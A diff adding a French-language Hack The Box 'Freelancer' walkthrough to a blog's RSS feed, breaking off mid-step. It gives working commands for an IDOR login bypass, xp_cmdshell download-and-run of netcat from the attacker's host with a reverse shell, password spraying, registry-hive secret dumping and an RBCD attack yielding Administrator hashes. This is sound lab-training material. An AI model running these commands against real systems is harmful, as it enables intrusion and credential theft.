@@ -6,8 +6,294 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>fr</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Fri, 27 Sep 2024 22:53:03 -0500</lastBuildDate>
+        <lastBuildDate>Mon, 30 Sep 2024 13:36:12 -0500</lastBuildDate>
         <atom:link href="https://scorpiosec.com/fr/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HTB: Freelancer</title>
+            <link>https://scorpiosec.com/fr/posts/2024/09/htb-freelancer/</link>
+            <pubDate>Mon, 30 Sep 2024 13:36:12 -0500</pubDate>
+            
+            <guid>https://scorpiosec.com/fr/posts/2024/09/htb-freelancer/</guid>
+            <description>Platforme: Hack The Box Lien: Freelancer Niveau: Difficile OS: Windows Freelancer consiste à exploiter une application web et, plus tard, un contrôleur de domaine. Le site web permet la création de deux types de comptes. Après l&amp;rsquo;enregistrement, nous exploitons une vulnérabilité IDOR (Insecure Direct Object Reference) pour accéder à un compte administrateur. Sur la page d&amp;rsquo;administration, nous trouvons un terminal SQL, que nous utilisons pour obtenir notre accès initial.</description>
+            <content type="html"><![CDATA[<ul>
+<li>Platforme: Hack The Box</li>
+<li>Lien: <a href="https://app.hackthebox.com/machines/Freelancer" target="_blank" >Freelancer</a>
+
+</li>
+<li>Niveau: Difficile</li>
+<li>OS: Windows</li>
+</ul>
+<hr>
+<p>Freelancer consiste à exploiter une application web et, plus tard, un contrôleur de domaine. Le site web permet la création de deux types de comptes. Après l&rsquo;enregistrement, nous exploitons une vulnérabilité IDOR (Insecure Direct Object Reference) pour accéder à un compte administrateur. Sur la page d&rsquo;administration, nous trouvons un terminal SQL, que nous utilisons pour obtenir notre accès initial.</p>
+<p>Une exploration plus poussée du système révèle des mots de passe dans un fichier de configuration, que nous comparons à une liste d&rsquo;utilisateurs, ce qui nous permet de pivoter vers un autre compte et d&rsquo;obtenir le drapeau utilisateur. Nous extrayons ensuite une archive 7z contenant un vidage de mémoire complet. En utilisant MemProcFS, nous analysons le dump et récupérons un autre mot de passe, nous permettant de prendre le contrôle d&rsquo;un autre compte.</p>
+<p>Avec Bloodhound, nous identifions la présence de la permission <code>GenericWrite</code>, que nous exploitons par le biais d&rsquo;une délégation restreinte basée sur les ressources (RBCD). Nous obtenons ainsi le hash de l&rsquo;administrateur, ce qui nous permet d&rsquo;obtenir le drapeau root.</p>
+<p>Adresse IP cible - <code>10.10.11.5</code></p>
+<h2 id="balayage">Balayage</h2>
+<pre tabindex="0"><code>./nmap_scan.sh 10.10.11.5 Freelancer
+</code></pre><blockquote>
+<p>J&rsquo;utilise un script pour le processus de balayage, disponible <a href="https://github.com/K-Scorpio/scripts-collection/blob/main/nmap_scan.sh" target="_blank" >ici</a>
+
+.</p>
+</blockquote>
+<p><strong>Résultats</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Running detailed scan on open ports: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49680,49685,51337,55297
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-09-30 13:27 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.5
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.053s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp    open  http          nginx 1.25.5
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.25.5
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://freelancer.htb/
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-09-30 23:27:24Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: freelancer.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: freelancer.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>9389/tcp  open  adws?
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   DNSStatusRequestTCP, Kerberos, SMBProgNeg, afp, oracle-tns: 
+</span></span><span style="display:flex;"><span>|_    Ihttp://schemas.microsoft.com/ws/2006/05/framing/faults/UnsupportedVersion
+</span></span><span style="display:flex;"><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49671/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49676/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49680/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49685/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>51337/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>55297/tcp open  ms-sql-s      Microsoft SQL Server <span style="color:#ae81ff">2019</span> 15.00.2000.00; RTM
+</span></span><span style="display:flex;"><span>| ms-sql-ntlm-info: 
+</span></span><span style="display:flex;"><span>|   10.10.11.5<span style="color:#ae81ff">\S</span>QLEXPRESS: 
+</span></span><span style="display:flex;"><span>|     Target_Name: FREELANCER
+</span></span><span style="display:flex;"><span>|     NetBIOS_Domain_Name: FREELANCER
+</span></span><span style="display:flex;"><span>|     NetBIOS_Computer_Name: DC
+</span></span><span style="display:flex;"><span>|     DNS_Domain_Name: freelancer.htb
+</span></span><span style="display:flex;"><span>|     DNS_Computer_Name: DC.freelancer.htb
+</span></span><span style="display:flex;"><span>|     DNS_Tree_Name: freelancer.htb
+</span></span><span style="display:flex;"><span>|_    Product_Version: 10.0.17763
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-09-30T23:28:31+00:00; +5h00m00s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-09-30T15:02:05
+</span></span><span style="display:flex;"><span>|_Not valid after:  2054-09-30T15:02:05
+</span></span><span style="display:flex;"><span>| ms-sql-info: 
+</span></span><span style="display:flex;"><span>|   10.10.11.5<span style="color:#ae81ff">\S</span>QLEXPRESS: 
+</span></span><span style="display:flex;"><span>|     Instance name: SQLEXPRESS
+</span></span><span style="display:flex;"><span>|     Version: 
+</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server <span style="color:#ae81ff">2019</span> RTM
+</span></span><span style="display:flex;"><span>|       number: 15.00.2000.00
+</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server <span style="color:#ae81ff">2019</span>
+</span></span><span style="display:flex;"><span>|       Service pack level: RTM
+</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
+</span></span><span style="display:flex;"><span>|     TCP port: <span style="color:#ae81ff">55297</span>
+</span></span><span style="display:flex;"><span>|     Named pipe: <span style="color:#ae81ff">\\</span>10.10.11.5<span style="color:#ae81ff">\p</span>ipe<span style="color:#ae81ff">\M</span>SSQL$SQLEXPRESS<span style="color:#ae81ff">\s</span>ql<span style="color:#ae81ff">\q</span>uery
+</span></span><span style="display:flex;"><span>|_    Clustered: false
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port9389-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>9/30%Time<span style="color:#f92672">=</span>66FAED91%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r
+</span></span><span style="display:flex;"><span>SF:<span style="color:#f92672">(</span>DNSStatusRequestTCP,4B,<span style="color:#e6db74">&#34;\x08Ihttp://schemas\.microsoft\.com/ws/2006/05
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:/framing/faults/UnsupportedVersion&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Kerberos,4B,<span style="color:#e6db74">&#34;\x08Ihttp://schemas
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\.microsoft\.com/ws/2006/05/framing/faults/UnsupportedVersion&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SMBPr
+</span></span><span style="display:flex;"><span>SF:ogNeg,4B,<span style="color:#e6db74">&#34;\x08Ihttp://schemas\.microsoft\.com/ws/2006/05/framing/faults
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:/UnsupportedVersion&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>oracle-tns,4B,<span style="color:#e6db74">&#34;\x08Ihttp://schemas\.microsoft\.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:com/ws/2006/05/framing/faults/UnsupportedVersion&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>afp,4B,<span style="color:#e6db74">&#34;\x08Ihttp:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF://schemas\.microsoft\.com/ws/2006/05/framing/faults/UnsupportedVersion&#34;</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2024-09-30T23:28:19
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 74.93 seconds
+</span></span></code></pre></div><p>Nous avons affaire à un contrôleur de domaine, un site web et une redirection vers <code>freelancer.htb</code>. Mettons à jour notre fichier <code>/etc/hosts</code>.</p>
+<pre tabindex="0"><code>sudo echo &#34;10.10.11.5 freelancer.htb dc.freelancer.htb&#34; | sudo tee -a /etc/hosts
+</code></pre><h2 id="enumération">Enumération</h2>
+<p>Nous trouvons un site web à l&rsquo;adresse <code>http://freelancer.htb/</code>. Il s&rsquo;agit d&rsquo;une plateforme de freelancing et nous pouvons nous inscrire soit en tant qu&rsquo;employeur, soit en tant que freelancer.</p>
+<p><img src="/images/HTB-Freelancer/freelancer_website.png" alt="Freelancer website"></p>
+<p>Essayons de créer un compte employeur. Il y a une politique de mot de passe qui refuse les mots de passe trop commun, j&rsquo;ai utilisé <code>Pa$$w0rd95</code>.</p>
+<p><img src="/images/HTB-Freelancer/registration.png" alt="Employer account registration"></p>
+<p>La tentative de connexion échoue car notre compte nouvellement créé n&rsquo;est pas actif.</p>
+<p><img src="/images/HTB-Freelancer/account_inactive.png" alt="Account inactive"></p>
+<p>Nous pouvons contourner cette mesure en réinitialisant le mot de passe et en nous reconnectant. Pour le nouveau mot de passe, j&rsquo;ai utilisé <code>Pa$$w0rd10</code>. Nous sommes maintenant en mesure de nous connecter et d&rsquo;accéder au tableau de bord.</p>
+<p><img src="/images/HTB-Freelancer/Freelancer_Dashboard.png" alt="Freelancer Dashboard"></p>
+<p>Dans la section <code>QR-Code</code>, nous obtenons un QR-Code permettant de se connecter sans utiliser d&rsquo;identifiants. Pour déterminer où il mène, nous utilisons <code>zbarimg</code>.</p>
+<p><img src="/images/HTB-Freelancer/QRcode_section.png" alt="QR-Code section"></p>
+<pre tabindex="0"><code>sudo apt install zbar-tools
+zbarimg QR-Code.png
+</code></pre><blockquote>
+<p>J&rsquo;ai enregistré l&rsquo;image du qr-code sous le nom <code>QR-Code.png</code>.</p>
+</blockquote>
+<p><img src="/images/HTB-Freelancer/zbarimg.png" alt="zbarimg tool"></p>
+<p>Le lien fourni nous amène à notre page de profil.</p>
+<p><img src="/images/HTB-Freelancer/profile_page.png" alt="profile page"></p>
+<p>Lorsque nous examinons de plus près le lien généré, il semble contenir une chaîne base64 <code>MTAwMTA=</code> qui donne <code>10010</code> lorsqu&rsquo;elle est décodée. Puisque le qrcode nous permet de nous connecter sans aucun identifiant, nous pouvons supposer que ce numéro est un identifiant de compte et que la chaîne suivante est une valeur de token.</p>
+<p>Nous allons tester une vulnérabilité potentielle de type IDOR (Insecure Direct Object Reference). Si l&rsquo;url est toujours valide après avoir modifié l&rsquo;ID, nous pourrions être en mesure d&rsquo;accéder à un compte administrateur, qui a généralement un numéro d&rsquo;ID tel que 1 ou 2.</p>
+<p>Par exemple : Si notre lien QR-Code est <code>http://freelancer.htb/accounts/login/otp/MTAwMTA=/d134f9ff8e33c6bdcefc73a7597e4552/</code> nous utiliserons <code>http://freelancer.htb/accounts/login/otp/Mgo=/d134f9ff8e33c6bdcefc73a7597e4552/</code>.</p>
+<p>Il s&rsquo;avère qu&rsquo;avec un numéro d&rsquo;identification de 2, nous pouvons accéder à un compte administrateur. Il suffit de remplacer <code>MTAwMTA=</code> par <code>Mgo=</code> (chaîne base64 pour <code>2</code>).</p>
+<p><img src="/images/HTB-Freelancer/admin_account.png" alt="admin account"></p>
+<p>De retour à l&rsquo;énumération, nous découvrons une page <code>admin</code> à laquelle nous pouvons accéder.</p>
+<p><img src="/images/HTB-Freelancer/gobuster_findings.png" alt="gobuster command results"></p>
+<p><img src="/images/HTB-Freelancer/freelancer_admindb.png" alt="Freelancer admin dashboard"></p>
+<h2 id="accès-initial">Accès Initial</h2>
+<p>Nous pouvons utiliser un terminal SQL sous <code>Development Tools</code>. Nous nous en servons pour exécuter quelques requêtes afin d&rsquo;obtenir un reverse shell.</p>
+<blockquote>
+<p>Nous téléchargeons <a href="https://github.com/andrew-d/static-binaries/tree/master/binaries/windows/x86" target="_blank" >ici</a>
+
+ le binaire <code>netcat</code> pour Windows, puis nous configurons un serveur web Python pour le placer sur la cible et enfin nous obtenons notre reverse shell en l&rsquo;exécutant.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span> <span style="color:#66d9ef">AS</span> LOGIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;sa&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span> sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>, <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>RECONFIGURE;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span> sp_configure <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span>, <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>RECONFIGURE;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span> xp_cmdshell <span style="color:#e6db74">&#34;powershell.exe wget http://YOUR_IP/ncat.exe -OutFile C:\temp\nc.exe&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span> xp_cmdshell <span style="color:#e6db74">&#34;powershell.exe C:\temp\nc.exe YOUR_IP PORT_NUMBER -e powershell&#34;</span>
+</span></span></code></pre></div><p><img src="/images/HTB-Freelancer/sql_revshell.png" alt="SQL reverse shell"></p>
+<p>Nous avons maintenant un shell en tant que <code>sql_svc</code> qui est probablement un compte de service.</p>
+<p><img src="/images/HTB-Freelancer/foothold.png" alt="shell as sql_svc"></p>
+<p>Nous trouvons différents utilisateurs sur la cible.</p>
+<p><img src="/images/HTB-Freelancer/users_list.png" alt="users list"></p>
+<p>Dans <code>C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU\sql-Configuration.INI</code> nous découvrons deux mots de passe.</p>
+<p><img src="/images/HTB-Freelancer/passwords_list.png" alt="passwords list"></p>
+<p>A ce stade, nous avons une liste d&rsquo;utilisateurs et de mots de passe, nous pouvons utiliser netexec pour faire du brute-forcing.</p>
+<pre tabindex="0"><code>netexec smb 10.10.11.5 -u users.txt -p pwd.txt
+</code></pre><p>Les identifiants <code>mikasaAckerman:IL0v3ErenY3ager</code> sont valides.</p>
+<p><img src="/images/HTB-Freelancer/netexec_bruteforcing.png" alt="netexec command"></p>
+<p>Nous téléchargeons <a href="https://github.com/antonioCoco/RunasCs" target="_blank" >RunasCs</a>
+
+ sur la cible et exécutons la commande ci-dessous.</p>
+<pre tabindex="0"><code>.\runascs.exe mikasaAckerman &#34;IL0v3ErenY3ager&#34; powershell -r &lt;YOUR_IP_ADDRESS&gt;:&lt;PORT_NUMBER&gt;
+</code></pre><p><img src="/images/HTB-Freelancer/runascs_cmd.png" alt="runascs command"></p>
+<p>Sur notre listener, nous acquérons un shell sous le nom de <code>mikasaackerman</code>.</p>
+<p><img src="/images/HTB-Freelancer/mickasa_shell.png" alt="mickasaackerman shell"></p>
+<p>Sur le bureau, nous trouvons le drapeau utilisateur et deux autres fichiers <code>mail.txt</code> et <code>MEMORY.7z</code>.</p>
+<p><img src="/images/HTB-Freelancer/user_flag.png" alt="mickasaackerman desktop"></p>
+<p>Grâce au fichier txt, nous apprenons que <code>MEMORY.7z</code> contient un vidage de mémoire complet, nous le transférerons sur notre machine locale pour un examen plus approfondi.</p>
+<p><img src="/images/HTB-Freelancer/mail_to_mikasa.png" alt="mickasaackerman mail"></p>
+<p>Sur notre machine kali, nous démarrons un serveur FTP.</p>
+<blockquote>
+<p>Utilisez <code>sudo apt install python3-pyftpdlib</code> pour installer le module s&rsquo;il est absent.</p>
+</blockquote>
+<pre tabindex="0"><code>sudo python3 -m pyftpdlib --port 21 --write
+</code></pre><p><img src="/images/HTB-Freelancer/ftp_server.png" alt="Python FTP server"></p>
+<p>Sur la cible, nous exécutons la commande suivante.</p>
+<pre tabindex="0"><code>(New-Object Net.WebClient).UploadFile(&#39;ftp://YOUR_IP/MEMORY.7z&#39;, &#39;C:\Users\mikasaAckerman\Desktop\MEMORY.7z&#39;)
+</code></pre><p><img src="/images/HTB-Freelancer/file_upload.png" alt="MEMORY.7z File upload"></p>
+<p>Après quelques minutes, nous obtenons l&rsquo;archive, nous l&rsquo;extrayons avec <code>7z x MEMORY.7z</code> et nous nous retrouvons avec un fichier nommé <code>MEMORY.DMP</code>.</p>
+<blockquote>
+<p>Vous pouvez installer 7z avec <code>sudo apt-get install p7zip-full</code>.</p>
+</blockquote>
+<p><img src="/images/HTB-Freelancer/memory_dump_file.png" alt="Memory dump file"></p>
+<p>Nous utilisons <a href="https://github.com/ufrisk/MemProcFS" target="_blank" >MemProcFS</a>
+
+ pour examiner le vidage de mémoire. Tout d&rsquo;abord, nous devons installer toutes les dépendances.</p>
+<pre tabindex="0"><code>sudo apt-get install libusb-1.0 fuse openssl lz4
+</code></pre><p>Ensuite, nous téléchargeons l&rsquo;archive depuis Github <a href="https://github.com/ufrisk/MemProcFS/releases/tag/v5.11" target="_blank" >ici</a>
+
+. Après l&rsquo;avoir extrait, exécutez la commande ci-dessous.</p>
+<blockquote>
+<p>Si l&rsquo;opération de montage échoue et que vous obtenez <code>fuse : failed to access mountpoint /mnt/memprocfs : No such file or directory</code>, créez le répertoire dans <code>/mnt</code>.</p>
+</blockquote>
+<pre tabindex="0"><code>sudo ./memprocfs -f &lt;MEMORY.DMP file location&gt; -forensic 1 -mount /mnt/memprocfs
+</code></pre><p><img src="/images/HTB-Freelancer/memprocfs_command.png" alt="MemProcFS command"></p>
+<p>Nous avons besoin d&rsquo;être root pour accéder au répertoire monté.</p>
+<p><img src="/images/HTB-Freelancer/memory_mnt.png" alt="MemProcFS mounted directory"></p>
+<p>Dans <code>/mnt/memprocfs/registry/hive_files</code> nous trouvons les fichiers bruts de la ruche du registre Windows extraits du vidage de la mémoire. À partir de là, nous utiliserons les fichiers nécessaires pour trouver des informations sensibles:</p>
+<ul>
+<li><strong>SAM (Security Account Manager)</strong>: Cette ruche contient des informations sur les comptes d&rsquo;utilisateurs et les mots de passe hachés des utilisateurs locaux.</li>
+<li><strong>SYSTEM</strong>: Elle comprend généralement des informations sur le système, telles que la configuration des pilotes, les paramètres du matériel, etc. De plus, elle détient également la clé nécessaire pour décrypter les mots de passe stockés dans la ruche SAM.</li>
+<li><strong>SECURITY</strong>: Toutes les informations relatives à la sécurité sont stockées ici, y compris les attributions de droits, les stratégies de compte et les secrets LSA cryptés (qui peuvent contenir des informations d&rsquo;identification de domaine mises en cache et d&rsquo;autres données sensibles).</li>
+</ul>
+<p><img src="/images/HTB-Freelancer/hive_files.png" alt="hive files list"></p>
+<pre tabindex="0"><code>impacket-secretsdump -sam 0xffffd3067d935000-SAM-MACHINE_SAM.reghive -system 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive -security 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive local
+</code></pre><p><img src="/images/HTB-Freelancer/reghive_dump.png" alt="registry hive files dump"></p>
+<p>Nous récupérons un autre mot de passe <code>PWN3D#l0rr@Armessa199</code>, que nous testons avec notre liste d&rsquo;utilisateurs.</p>
+<pre tabindex="0"><code>netexec smb 10.10.11.5 -u users.txt -p PWN3D#l0rr@Armessa199
+</code></pre><p>Nous obtenons une confirmation pour les informations d&rsquo;identification <code>lorra199:PWN3D#l0rr@Armessa199</code>.</p>
+<p><img src="/images/HTB-Freelancer/lorra_creds.png" alt="lorra199 credentials"></p>
+<p>Nous nous connectons en tant que cet utilisateur avec <code>evil-winrm -i 10.10.11.5 -u lorra199 -p PWN3D#l0rr@Armessa199</code>.</p>
+<p><img src="/images/HTB-Freelancer/lorra_shell.png" alt="lorra199 login"></p>
+<h2 id="elévation-de-privilèges">Elévation de Privilèges</h2>
+<p>Ce compte ne semble pas contenir d&rsquo;éléments intéressants, alors lançons Bloodhound à partir de ce point pour tenter de trouver d&rsquo;autres pistes.</p>
+<pre tabindex="0"><code>bloodhound-python -c all -u lorra199 -p &#39;PWN3D#l0rr@Armessa199&#39; -d freelancer.htb -dc dc.freelancer.htb -ns 10.10.11.5
+</code></pre><p><img src="/images/HTB-Freelancer/bloodhound_cmd.png" alt="bloodhound command"></p>
+<p>Nous constatons que lorra199 est membre de <code>AD Recycle Bin</code>. La corbeille Active Directory est une fonctionnalité qui permet aux administrateurs de récupérer les objets AD supprimés accidentellement, tels que les utilisateurs ou les unités d&rsquo;organisation (OU), sans avoir à les restaurer à partir de sauvegardes.</p>
+<p><img src="/images/HTB-Freelancer/AD_Recycle_bin.png" alt="AD Recycle bin membership"></p>
+<p>Vérifions les objets supprimés.</p>
+<pre tabindex="0"><code>Get-ADObject -filter &#39;isdeleted -eq $true -and name -ne &#34;Deleted Objects&#34;&#39; -includeDeletedObjects -property *
+</code></pre><p>Nous trouvons le compte <code>liza.kazanof</code> dans la corbeille.</p>
+<p><img src="/images/HTB-Freelancer/ad_recylce_bin.png" alt="AD Recycle bin content"></p>
+<p>Nous pouvons restaurer l&rsquo;objet en utilisant son <code>ObjectGUID</code>.</p>
+<pre tabindex="0"><code>Restore-ADObject -identity &#34;ebe15df5-e265-45ec-b7fc-359877217138&#34;
+</code></pre><blockquote>
+<p>Je ne suis pas sûr qu&rsquo;il soit possible d&rsquo;accéder au compte administrateur depuis le compte de Liza Kazanof. Je mettrai à jour cette partie si je trouve un chemin d&rsquo;exploitation pour le faire.</p>
+</blockquote>
+<p>Les membres de <code>AD Recycle Bin</code> ont la permission <code>GenericWrite</code> sur le contrôleur de domaine, nous pouvons l&rsquo;utiliser pour exploiter la cible par une délégation restreinte basée sur les ressources (RBCD). <em>Pour en savoir plus, cliquez <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation" target="_blank" >ici</a>
+
+</em>.</p>
+<p><img src="/images/HTB-Freelancer/GenericWrite_priv.png" alt="GenericWrite privilege"></p>
+<ol>
+<li>Tout d&rsquo;abord, nous créons un compte d&rsquo;ordinateur (<code>KSCORPIO$</code>) dans le domaine avec un mot de passe spécifié (<code>LETSgetr00t!</code>).</li>
+</ol>
+<pre tabindex="0"><code>impacket-addcomputer -computer-name &#39;KSCORPIO$&#39; -computer-pass &#39;LETSgetr00t!&#39; -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:&#39;PWN3D#l0rr@Armessa199&#39;
+</code></pre><p><img src="/images/HTB-Freelancer/impacket_addcomputer.png" alt="GenericWrite privilege"></p>
+<ol start="2">
+<li>Nous modifions ensuite l&rsquo;attribut <code>msDS-AllowedToActOnBehalfOtherIdentity</code> sur le contrôleur de domaine (<code>DC$</code>) pour inclure l&rsquo;objet <code>KSCORPIO$</code> afin d&rsquo;usurper l&rsquo;identité d&rsquo;autres comptes contre <code>DC$</code>.</li>
+</ol>
+<pre tabindex="0"><code>impacket-rbcd -delegate-from &#39;KSCORPIO$&#39; -delegate-to &#39;DC$&#39; -dc-ip 10.10.11.5 -action &#39;write&#39; &#39;freelancer.htb/lorra199:PWN3D#l0rr@Armessa199&#39;
+</code></pre><p><img src="/images/HTB-Freelancer/rbcd_delegation.png" alt="Delegation modification"></p>
+<ol start="3">
+<li>Nous obtenons un ticket Kerberos pour le service CIFS sur le contrôleur de domaine (<code>dc.freelancer.htb</code>), en nous faisant passer pour <strong>Administrator</strong>. Ce ticket nous permet d&rsquo;effectuer diverses opérations au nom du compte administrateur sur la machine cible.</li>
+</ol>
+<pre tabindex="0"><code>faketime -f +5h impacket-getST -spn &#39;cifs/dc.freelancer.htb&#39; -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/KSCORPIO$:&#39;LETSgetr00t!&#39;
+</code></pre><blockquote>
+<p>Le SPN (Service Principal Name) <code>cifs/dc.freelancer.htb</code> indique que nous voulons nous authentifier au service de partage de fichiers sur le contrôleur de domaine. Le service CIFS est essentiellement une extension du protocole SMB. <em>Pour en savoir plus, cliquez <a href="https://www.upguard.com/blog/cifs" target="_blank" >ici</a>
+
+.</em></p>
+</blockquote>
+<p><img src="/images/HTB-Freelancer/Kerberos_ticket.png" alt="Kerberos ticket"></p>
+<ol start="4">
+<li>Pour qu&rsquo;Impacket utilise notre ticket, nous définissons une variable d&rsquo;environnement pointant vers le fichier de cache.</li>
+</ol>
+<pre tabindex="0"><code>export KRB5CCNAME=Administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache
+</code></pre><p><img src="/images/HTB-Freelancer/env_var.png" alt="environmental variable for kerberos ticket use"></p>
+<ol start="5">
+<li>Nous pouvons maintenant extraire les hashs NTLM du contrôleur de domaine. Nous obtenons de nombreux hashs dont celui de l&rsquo;administrateur.</li>
+</ol>
+<pre tabindex="0"><code>faketime -f +5h impacket-secretsdump &#39;freelancer.htb/Administrator@DC.freelancer.htb&#39; -k -no-pass -dc-ip 10.10.11.5 -target-ip 10.10.11.5 -just-dc-ntlm
+</code></pre><blockquote>
